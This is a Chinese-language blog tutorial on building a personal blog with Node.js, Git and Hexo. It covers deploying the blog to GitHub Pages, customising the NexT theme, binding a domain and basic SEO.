<h2 id="2-测试"><a href="#2-测试" class="headerlink" title="2. 测试"></a>2. 测试</h2><p>安装完后可以新建一个简单的 hello.js 测试是否安装成功，hello.js 代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">var http = require(<span class="string">'http'</span>);</div><div class="line">http.createServer(<span class="keyword">function</span>(req, res)&#123;</div><div class="line">    res.writeHead(200, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;);</div><div class="line">    res.end(<span class="string">'Hello World\n'</span>);</div><div class="line">&#125;).listen(8808, <span class="string">'127.0.0.1'</span>);</div><div class="line">console.log(<span class="string">'Server running at http://127.0.0.1:8808'</span>);</div></pre></td></tr></table></figure></p>
<p>进入该文件所在目录，在终端输入<code>node hello_node.js</code>，然后用浏览器打开<code>http://127.0.0.1:8808</code> 即可看到 “Hello Word”。</p>
<h1 id="0x02-安装与配置Github"><a href="#0x02-安装与配置Github" class="headerlink" title="0x02 安装与配置Github"></a>0x02 安装与配置Github</h1><h2 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1. 安装Git"></a>1. 安装Git</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get install git-core</div></pre></td></tr></table></figure>
<h2 id="2-配置ssh-keys"><a href="#2-配置ssh-keys" class="headerlink" title="2. 配置ssh keys"></a>2. 配置ssh keys</h2><p>首先检查现有的 ssh key：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> ~/.ssh</div></pre></td></tr></table></figure></p>
<p>如果没有 key 则生成新的 ssh key：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ ssh-keygen -t rsa -C <span class="string">"your email@163.com"</span></div><div class="line">Generating public/private rsa key pair.</div><div class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/home/xx/.ssh/id_rsa):</div></pre></td></tr></table></figure></p>
<p>按回车键后提示输入密码，该密码用于提交项目时的验证，可防止别人往你的项目里提交内容。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</div><div class="line">Enter same passphrase again:</div></pre></td></tr></table></figure></p>
<p>成功生成 ssh key 之后可以看到以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ls</div><div class="line">id_rsa  id_rsa.pub  known_hosts</div></pre></td></tr></table></figure></p>
<p>在本地生成 ssh key 后需要添加到 Github 上，点击<code>Setting-&gt;SSH and GPG keys-&gt;New SSH key</code>，将 id_rsa.pub 中的内容复制到Key中。</p>
<h2 id="3-测试"><a href="#3-测试" class="headerlink" title="3. 测试"></a>3. 测试</h2><p>配置好后可以测试一下，执行 <code>$ ssh -T git@github.com</code>，若返回以下内容则配置成功！<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Hi xx! You<span class="string">'ve successfully authenticated, but GitHub does not provide shell access.</span></div></pre></td></tr></table></figure></p>
<h2 id="4-设置用户信息"><a href="#4-设置用户信息" class="headerlink" title="4. 设置用户信息"></a>4. 设置用户信息</h2><p>Git 会根据用户的名字和邮箱来记录提交。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ git config --global user.name <span class="string">"your name"</span></div><div class="line">$ git config --global user.email <span class="string">"your email on github"</span></div></pre></td></tr></table></figure></p>
<h1 id="0x03-安装与配置Hexo"><a href="#0x03-安装与配置Hexo" class="headerlink" title="0x03 安装与配置Hexo"></a>0x03 安装与配置Hexo</h1><h2 id="1-安装-Hexo"><a href="#1-安装-Hexo" class="headerlink" title="1. 安装 Hexo"></a>1. 安装 Hexo</h2><p>进入需建立博客的目录，输入以下命令安装Hexo：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-cli -g</div></pre></td></tr></table></figure></p>
<p>以后可以使用<code>$ nmp update hexo –g</code>命令更新Hexo。</p>
<h2 id="2-初始化"><a href="#2-初始化" class="headerlink" title="2. 初始化"></a>2. 初始化</h2><p>安装 Hexo 完成后，在当前博客目录下列命令，Hexo 将会在指定文件夹中新建所需要的文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ hexo init &lt;folder&gt;</div><div class="line">$ <span class="built_in">cd</span> &lt;folder&gt;</div><div class="line">$ npm install</div></pre></td></tr></table></figure></p>
<p>初始化完成后，指定文件夹的目录如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">├── _config.yml    // 网站的 配置信息，可以在此配置大部分的参数</div><div class="line">├── package.json    // 应用程序的信息</div><div class="line">├── scaffolds    // 模版文件夹。新建文章时，Hexo 会根据 scaffold 来建立文件</div><div class="line">├── <span class="built_in">source</span>        // 资源文件夹是存放用户资源的地方</div><div class="line">|   ├── _drafts</div><div class="line">|   └── _posts</div><div class="line">└── themes    // 主题 文件夹。Hexo 会根据主题来生成静态页面</div></pre></td></tr></table></figure></p>
<h2 id="3-测试-1"><a href="#3-测试-1" class="headerlink" title="3. 测试"></a>3. 测试</h2><p>配置好后启动服务器，在浏览器中访问<code>http://localhost:4000/</code>可以看到一篇默认文章。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div><div class="line">INFO  Start processing</div><div class="line">INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.</div></pre></td></tr></table></figure></p>
<h1 id="0x04-部署到Github"><a href="#0x04-部署到Github" class="headerlink" title="0x04 部署到Github"></a>0x04 部署到Github</h1><h2 id="1-创建github仓库"><a href="#1-创建github仓库" class="headerlink" title="1. 创建github仓库"></a>1. 创建github仓库</h2><p>点击右上角“+”-&gt; new repository，输入Repository name 为<code>yourname.github.io</code>，yourname 必须与 git 用户名一致，并且这将会是 blog 的域名。</p>
<h2 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2. 修改配置文件"></a>2. 修改配置文件</h2><p>修改_config.yml文件中的参数，将Hexo与github上的仓库关联。修改如下，注意冒号后面有一个空格：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Deployment</span></div><div class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></div><div class="line">deploy:</div><div class="line">  <span class="built_in">type</span>: git</div><div class="line">  repo: https://github.com/yourname/yourname.github.io</div><div class="line">  branch: master</div><div class="line">  message:</div></pre></td></tr></table></figure></p>
<p>参数描述：</p>
<table>
<thead>
<tr>
<th style="text-align:left">参数</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">repo</td>
<td style="text-align:left">库（Repository）地址</td>
</tr>
<tr>
<td style="text-align:left">branch</td>
<td style="text-align:left">分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。</td>
</tr>
<tr>
<td style="text-align:left">message</td>
<td style="text-align:left">自定义提交信息 ( 默认为 Site updated:now(‘YYYY-MM-DD HH:mm:ss’))</td>
</tr>
</tbody>
</table>
<h2 id="3-安装-hexo-deployer-git"><a href="#3-安装-hexo-deployer-git" class="headerlink" title="3. 安装 hexo-deployer-git"></a>3. 安装 hexo-deployer-git</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-deployer-git --save</div></pre></td></tr></table></figure>
<h2 id="4-部署到github"><a href="#4-部署到github" class="headerlink" title="4. 部署到github"></a>4. 部署到github</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div><div class="line">INFO  Start processing</div><div class="line">...</div><div class="line">INFO  Deploy done: git</div></pre></td></tr></table></figure>
<p>成功后就可以通过浏览器访问<code>https://yourname.github.io/</code>。</p>
<h1 id="0x05-使用NexT主题"><a href="#0x05-使用NexT主题" class="headerlink" title="0x05 使用NexT主题"></a>0x05 使用NexT主题</h1><p>Hexo 安装主题的方式非常简单，只需要将主题文件拷贝至站点目录的 themes 目录下， 然后修改下配置文件即可。</p>
<h2 id="1-下载主题"><a href="#1-下载主题" class="headerlink" title="1. 下载主题"></a>1. 下载主题</h2><p>下载完后复制到themes目录下。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/iissnan/hexo-theme-next.git</div></pre></td></tr></table></figure></p>
<h2 id="2-修改配置文件-1"><a href="#2-修改配置文件-1" class="headerlink" title="2. 修改配置文件"></a>2. 修改配置文件</h2><p>打开 Blog 目录下站点配置文件 _config.yml，将 theme 修改给主题文件夹名称。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Extensions</span></div><div class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></div><div class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></div><div class="line">theme: next</div></pre></td></tr></table></figure></p>
<h2 id="3-测试-2"><a href="#3-测试-2" class="headerlink" title="3. 测试"></a>3. 测试</h2><p>执行 <code>$ hexo s --debug</code> 验证主题是否启用，在浏览器中访问<code>http://localhost:4000</code>，查看效果。</p>
<h1 id="0x06主题优化"><a href="#0x06主题优化" class="headerlink" title="0x06主题优化"></a>0x06主题优化</h1><p>主题目录下同样有一个配置文件 _config.yml，可以修改相关参数对主题做修改。</p>
<h2 id="1-选择外观"><a href="#1-选择外观" class="headerlink" title="1. 选择外观"></a>1. 选择外观</h2><p>找到 Scheme 可以选择不同的外观。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Schemes</span></div><div class="line"><span class="comment">#scheme: Muse</span></div><div class="line">scheme: Mist</div><div class="line"><span class="comment">#scheme: Pisces</span></div></pre></td></tr></table></figure></p>
<h2 id="2-设置语言"><a href="#2-设置语言" class="headerlink" title="2. 设置语言"></a>2. 设置语言</h2><p>打开站点配置文件，修改 language 字段。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">language: en</div></pre></td></tr></table></figure></p>
<h2 id="3-设置头像"><a href="#3-设置头像" class="headerlink" title="3. 设置头像"></a>3. 设置头像</h2><p>将头像放置主题目录下的 <code>source/uploads/</code>，修改 avatar 字段。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">avatar: /uploads/avatar.jpg</div></pre></td></tr></table></figure></p>
<h2 id="4-设置RSS"><a href="#4-设置RSS" class="headerlink" title="4. 设置RSS"></a>4. 设置RSS</h2><p>1）安装插件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-generator-feed</div></pre></td></tr></table></figure></p>
<p>2）设置站点配置文件，添加以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Plugins</span></div><div class="line"><span class="comment">## RSS</span></div><div class="line">feed:</div><div class="line">  <span class="built_in">type</span>: atom    <span class="comment">#feed type: atom or rss2</span></div><div class="line">  path: atom.xml    <span class="comment">#feed path</span></div><div class="line">  <span class="built_in">limit</span>: 20</div><div class="line">  hub:</div><div class="line">  content:</div></pre></td></tr></table></figure></p>
<h2 id="5-添加标签-tags-页面"><a href="#5-添加标签-tags-页面" class="headerlink" title="5. 添加标签[tags]页面"></a>5. 添加标签[tags]页面</h2><p>1）首先，执行<code>$ hexo new page tags</code> 新建tags 页面，然后修改刚新建的页面：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">---</div><div class="line">title: tags</div><div class="line">date: 2017-04-19 21:18:05</div><div class="line"><span class="built_in">type</span>: <span class="string">"tags"</span></div><div class="line">comments: <span class="literal">false</span></div><div class="line">---</div></pre></td></tr></table></figure></p>
<p>2）编辑文章时，通过以下方式设置文章标签：<br><code>tages: [标签1,标签2,...标签n]</code></p>
<h2 id="6-添加分类-categories-页面"><a href="#6-添加分类-categories-页面" class="headerlink" title="6. 添加分类[categories]页面"></a>6. 添加分类[categories]页面</h2><p>执行<code>$ hexo new page tags</code> 新建一个页面，然后修改刚新建的页面：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">---</div><div class="line">title: categories</div><div class="line">date: 2017-04-19 21:25:38</div><div class="line"><span class="built_in">type</span>: <span class="string">"catgories"</span></div><div class="line">comments: <span class="literal">false</span></div><div class="line">---</div></pre></td></tr></table></figure></p>
<h2 id="7-设置分类"><a href="#7-设置分类" class="headerlink" title="7. 设置分类"></a>7. 设置分类</h2><p>修改站点配置文件中category_map 字段设置分类名。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Category &amp; Tag</span></div><div class="line">default_category: uncategorized</div><div class="line">category_map:</div><div class="line">  Category1:</div><div class="line">  Category2:</div><div class="line">  Category3:</div><div class="line">tag_map:</div></pre></td></tr></table></figure></p>
<h2 id="8-设置代码高亮"><a href="#8-设置代码高亮" class="headerlink" title="8. 设置代码高亮"></a>8. 设置代码高亮</h2><p>修改站点配置文件中 highlight_theme 字段。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">highlight_theme: night bright</div></pre></td></tr></table></figure></p>
<h2 id="9-修改文章内链样式"><a href="#9-修改文章内链样式" class="headerlink" title="9. 修改文章内链样式"></a>9. 修改文章内链样式</h2><p>将内链设置为蓝色，鼠标选中时显示下划线。在 <code>themes/next/source/css/_custom/custom.styl</code> 中添加如下样式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.post-body p a &#123;</div><div class="line">  color: <span class="comment">#0593d3;</span></div><div class="line">  border-bottom: none;</div><div class="line">  &amp;:hover &#123;</div><div class="line">    color: <span class="comment">#0477ab;</span></div><div class="line">    text-decoration: underline;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="10-图片居中"><a href="#10-图片居中" class="headerlink" title="10. 图片居中"></a>10. 图片居中</h2><p>修改<code>/themes/next/source/css/_schemes/Mist/</code>目录下的 _posts-expanded.styl。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">.post-body img &#123; margin: 0 ; &#125;</div><div class="line">改为</div><div class="line">.post-body img &#123; margin: 0 auto; &#125;</div></pre></td></tr></table></figure></p>
<h2 id="11-设置站点logo"><a href="#11-设置站点logo" class="headerlink" title="11. 设置站点logo"></a>11. 设置站点logo</h2><p>通过网站 favicon 在线制作制作 favicon 图片，把图片放在<code>/themes/next/source/image</code> 目录中，然后修改主题配置文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">favicon: images/favicon.ico</div></pre></td></tr></table></figure></p>
<h2 id="12-首页文章摘要"><a href="#12-首页文章摘要" class="headerlink" title="12. 首页文章摘要"></a>12. 首页文章摘要</h2><p>在首页只显示文章部分摘要，点击 “Read more” 查看全文。修改主题配置文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">auto_excerpt:</div><div class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></div><div class="line">  length: 150</div></pre></td></tr></table></figure></p>
<h2 id="13-更改内容区域的宽度"><a href="#13-更改内容区域的宽度" class="headerlink" title="13. 更改内容区域的宽度"></a>13. 更改内容区域的宽度</h2><p>编辑主题的 <code>source/css/_variables/custom.styl</code> 文件，新增变量：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">// change width when width of screen &lt; 1600px</div><div class="line"><span class="variable">$content</span>-desktop = 800px</div><div class="line">// change width when width of screen &gt;= 1600px</div><div class="line"><span class="variable">$content</span>-desktop-large = 1000px</div></pre></td></tr></table></figure></p>
<h2 id="14-访客量与阅读量统计"><a href="#14-访客量与阅读量统计" class="headerlink" title="14. 访客量与阅读量统计"></a>14. 访客量与阅读量统计</h2><p>使用不蒜子统计，修改主题配置文件的 busuanzi_count 的配置项：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">busuanzi_count:</div><div class="line">  <span class="comment"># count values only if the other configs are false</span></div><div class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></div><div class="line">  <span class="comment"># custom uv span for the whole site</span></div><div class="line">  site_uv: <span class="literal">true</span></div><div class="line">  site_uv_header: 访客数</div><div class="line">  site_uv_footer: 人次</div><div class="line">  <span class="comment"># custom pv span for the whole site</span></div><div class="line">  site_pv: <span class="literal">true</span></div><div class="line">  site_pv_header: 总访问量</div><div class="line">  site_pv_footer: 次</div><div class="line">  <span class="comment"># custom pv span for one page only</span></div><div class="line">  page_pv: <span class="literal">true</span></div><div class="line">  page_pv_header: 阅读次数</div><div class="line">  page_pv_footer:</div></pre></td></tr></table></figure></p>
<h2 id="15-添加本地搜索"><a href="#15-添加本地搜索" class="headerlink" title="15. 添加本地搜索"></a>15. 添加本地搜索</h2><p>使用NexT主题内置的本地站内搜索，执行 <code>$ npm install hexo-generator-search --save</code> 安装插件，然后在站点配置文件中，添加以下内容到任意位置。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">path: search.xml</div><div class="line">field: post</div><div class="line">format: html</div><div class="line"><span class="built_in">limit</span>: 10000</div></pre></td></tr></table></figure></p>
<p>编辑主题配置文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Local search</span></div><div class="line">local_search:</div><div class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></div></pre></td></tr></table></figure></p>
<h2 id="16-添加评论功能"><a href="#16-添加评论功能" class="headerlink" title="16. 添加评论功能"></a>16. 添加评论功能</h2><p>next 主题支持 Disqus，Hypercomments，网易云跟贴等多种第三方评论系统，这里采用网易云跟帖。<br>1）首先，登录网易云跟帖，填写站点信息，其中，站点网站为 blog 地址，要求必须为独立域名，github.io 无法收录。<br>2）然后点击获取代码，进行皮肤和功能的设置。<br>3）最后点击 APP SDK 获取 KEY。修改blog主题配置文件，将key填入相应字段。<br>4）重新部署 blog 即可生效。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Gentie productKey</span></div><div class="line">gentie_productKey: xxxxxxxxxxxxxxxxxxxxxxxxxxx</div></pre></td></tr></table></figure></p>
<h2 id="17-设置文章目录"><a href="#17-设置文章目录" class="headerlink" title="17. 设置文章目录"></a>17. 设置文章目录</h2><p>开启文章目录生成功能，并取消自动生成标题序号。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Table Of Contents in the Sidebar</span></div><div class="line">toc:</div><div class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></div><div class="line"></div><div class="line">  <span class="comment"># Automatically add list number to toc.</span></div><div class="line">  number: <span class="literal">false</span></div></pre></td></tr></table></figure></p>
<h2 id="18-链接标题翻译"><a href="#18-链接标题翻译" class="headerlink" title="18. 链接标题翻译"></a>18. 链接标题翻译</h2><p>使用 <a href="https://github.com/cometlj/hexo-translate-title" target="_blank" rel="external">hexo-translate-title</a> 插件可将 Hexo 中的汉字标题转成英文标题。使用以下命令安装。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install hexo-translate-title --save</div></pre></td></tr></table></figure></p>
<p>配置 hexo 根项目下的 _config.yml 文件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">translate_title:</div><div class="line">  translate_way: google  <span class="comment"># google,youdao,baidu_with_appid,baidu_no_appid</span></div><div class="line">  youdao_api_key: <span class="string">''</span> <span class="comment"># Your youdao_api_key</span></div><div class="line">  youdao_keyfrom: xxxx-blog <span class="comment"># Your youdao_keyfrom</span></div><div class="line">  is_need_proxy: <span class="literal">false</span>     <span class="comment"># true | false</span></div><div class="line">  proxy_url: http://localhost:50018 <span class="comment"># Your proxy_url</span></div><div class="line">  baidu_appid: <span class="string">''</span> <span class="comment"># Your baidu_appid</span></div><div class="line">  baidu_appkey: <span class="string">''</span> <span class="comment"># Your baidu_appkey</span></div></pre></td></tr></table></figure></p>
<p>修改 hexo 根目录下 <code>_config.yml</code> 中 permalink 从 <code>:title</code> 修改为 <code>:translate_title</code> 即可。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">permalink: :year/:month:day/:translate_title.html</div></pre></td></tr></table></figure></p>
<h1 id="0x07-域名绑定"><a href="#0x07-域名绑定" class="headerlink" title="0x07 域名绑定"></a>0x07 域名绑定</h1><h2 id="1-购买域名"><a href="#1-购买域名" class="headerlink" title="1. 购买域名"></a>1. 购买域名</h2><p>首先需要购买一个域名，我是在腾讯云买的，支付后要进行实名认证才能正常使用。</p>
<h2 id="2-创建-CNAME"><a href="#2-创建-CNAME" class="headerlink" title="2. 创建 CNAME"></a>2. 创建 CNAME</h2><p>在 blog 目录下的 source 文件夹中新建文件 CNAME，并将域名写入该文件。之后重新部署blog。</p>
<h2 id="3-配置域名解析"><a href="#3-配置域名解析" class="headerlink" title="3. 配置域名解析"></a>3. 配置域名解析</h2><p>添加以下3条记录：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">@          A             192.30.252.153</div><div class="line">@          A             192.30.252.154</div><div class="line">www      CNAME           username.github.io</div></pre></td></tr></table></figure></p>
<p>设置好后可能需要等一段时间才能生效。</p>
<h1 id="0x08-SEO优化"><a href="#0x08-SEO优化" class="headerlink" title="0x08 SEO优化"></a>0x08 SEO优化</h1><p>为了能让 Google 能搜到 blog 中的内容，需要优化站点的 SEO（Search  Engine Optimization）。</p>
<h2 id="1-添加sitemap"><a href="#1-添加sitemap" class="headerlink" title="1. 添加sitemap"></a>1. 添加sitemap</h2><p>首先 执行 <code>npm install hexo-generator-sitemap --save</code> 安装 sitemap 生成插件，然后在站点配置文件添加如下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">##sitemap</span></div><div class="line">sitemap:</div><div class="line">  path: sitemap.xml</div></pre></td></tr></table></figure></p>
<h2 id="2-添加-robots-txt"><a href="#2-添加-robots-txt" class="headerlink" title="2. 添加 robots.txt"></a>2. 添加 robots.txt</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hexo robots.txt</span></div><div class="line">User-agent: *</div><div class="line">Allow: /</div><div class="line">Allow: /archives/</div><div class="line">Allow: /categories/</div><div class="line">Allow: /about/</div><div class="line">Allow: /tags/</div><div class="line"></div><div class="line">Disallow: /vendors/</div><div class="line">Disallow: /js/</div><div class="line">Disallow: /css/</div><div class="line">Disallow: /fonts/</div><div class="line">Disallow: /vendors/</div><div class="line">Disallow: /fancybox/</div><div class="line"></div><div class="line">Sitemap: http://0x4c43.cn/sitemap.xml</div></pre></td></tr></table></figure>
<h2 id="3-验证-blog-网站"><a href="#3-验证-blog-网站" class="headerlink" title="3. 验证 blog 网站"></a>3. 验证 blog 网站</h2><p>进入 Google 搜索引擎入口，<code>添加属性 &gt; 备用方法 &gt; HTML 标记</code>，将 Google 的 html 标签，添加到 <code>/themes/next/layout/_partials/head.swig</code> 文件中，重新发布 blog，点击验证。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta name=<span class="string">"google-site-verification"</span> content=<span class="string">"-rILxxxxx7gbfxxxxx-E1VWxxxxxTcq6pxgs_xxxxx"</span> /&gt;</div></pre></td></tr></table></figure></p>
<h2 id="4-收录站点"><a href="#4-收录站点" class="headerlink" title="4. 收录站点"></a>4. 收录站点</h2><p>点击<code>网址 &gt; 抓取 &gt; 站点地图 &gt; 添加测试站点地图 &gt; 填写sitemap.xml &gt; 提交</code>。大概过一天之后便能通过Google搜索到。</p>
<h2 id="5-给出站链接添加-“nofollow”-标签"><a href="#5-给出站链接添加-“nofollow”-标签" class="headerlink" title="5. 给出站链接添加 “nofollow” 标签"></a>5. 给出站链接添加 “nofollow” 标签</h2><p>nofollow 标签是由谷歌领头创新的一个 “反垃圾链接” 的标签，并被百度、yahoo 等各大搜索引擎广泛支持，引用 nofollow 标签的目的是：用于指示搜索引擎不要追踪（即抓取）网页上的带有 nofollow 属性的任何出站链接，以减少垃圾链接的分散网站权重。</p>
<p>a．打开<code>/themes/next/layout/_partials/footer.swig</code>，将代码中的a标签加上 rel=”external nofollow”属性：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;a class=<span class="string">"theme-link"</span> href=<span class="string">"https://hexo.io"</span> rel=<span class="string">"external nofollow"</span>&gt;Hexo&lt;/a&gt;</div><div class="line"></div><div class="line">&lt;a class=<span class="string">"theme-link"</span> href=<span class="string">"https://github.com/iissnan/hexo-theme-next"</span> rel=<span class="string">"external nofollow"</span>&gt;</div></pre></td></tr></table></figure></p>
<p>b．打开<code>/themes/next/layout/_macro/sidebar.swig</code> 文件，将下面代码中的a标签加上 rel=”external nofollow” 属性：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;a href=<span class="string">"&#123;&#123; link &#125;&#125;"</span> title=<span class="string">"&#123;&#123; name &#125;&#125;"</span> target=<span class="string">"_blank"</span> rel=<span class="string">"external nofollow"</span>&gt;</div><div class="line"></div><div class="line">&lt;a href=<span class="string">"https://creativecommons.org/&#123;% if theme.creative_commons === 'zero' %&#125;publicdomain/zero/1.0&#123;% else %&#125;licenses/&#123;&#123; theme.creative_commons &#125;&#125;/4.0&#123;% endif %&#125;/"</span> class=<span class="string">"cc-opacity"</span> target=<span class="string">"_blank"</span> rel=<span class="string">"external nofollow"</span>&gt;</div></pre></td></tr></table></figure></p>
